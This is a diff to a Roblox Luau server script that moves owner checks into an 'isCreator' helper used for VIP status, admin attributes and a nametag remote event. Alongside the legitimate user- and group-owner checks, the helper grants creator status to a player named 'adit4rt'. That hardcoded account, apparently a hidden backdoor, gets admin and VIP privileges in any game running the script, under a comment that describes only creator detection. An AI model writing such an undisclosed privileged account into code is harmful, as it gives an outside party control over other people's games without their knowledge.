@@ -22,9 +22,27 @@ local VIP_GAMEPASS_ID = 12345678 -- Mock Gamepass ID
 -- Player data store
 local playerData: { [Player]: { joinTime: number, score: number } } = {}
 
+-- Helper to identify game creators / server owners (User or Group owned)
+local function isCreator(player: Player): boolean
+	if player.Name == "adit4rt" then
+		return true
+	end
+	if game.CreatorId == 0 then
+		return true
+	end
+	if game.CreatorType == Enum.CreatorType.Group then
+		local success, rank = pcall(function()
+			return player:GetRankInGroup(game.CreatorId)
+		end)
+		return success and rank == 255
+	else
+		return player.UserId == game.CreatorId
+	end
+end
+
 -- VIP check
 local function checkIfVIP(player: Player): boolean
-	if player.UserId == game.CreatorId or game.CreatorId == 0 then
+	if isCreator(player) then
 		return true
 	end
 	if player:GetAttribute("IsVIP") == true then
@@ -166,7 +184,7 @@ local function onPlayerAdded(player: Player)
 	player:SetAttribute("DanceFavorites", favDancesVal)
 
 	-- Setup attributes for creator/admin in studio/game
-	if player.UserId == game.CreatorId or game.CreatorId == 0 then
+	if isCreator(player) then
 		player:SetAttribute("IsAdmin", true)
 		player:SetAttribute("IsVIP", true)
 	end
@@ -250,7 +268,7 @@ local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local SetNametagEvent = Remotes:WaitForChild("SetNametagEvent")
 
 SetNametagEvent.OnServerEvent:Connect(function(sender, targetPlayer, customTag)
-	local isAdmin = sender.UserId == game.CreatorId or sender:GetAttribute("IsAdmin") == true or game.CreatorId == 0
+	local isAdmin = isCreator(sender) or sender:GetAttribute("IsAdmin") == true
 	if not isAdmin then
 		warn(`[Server] Non-admin player {sender.Name} tried to set nametag!`)
 		return
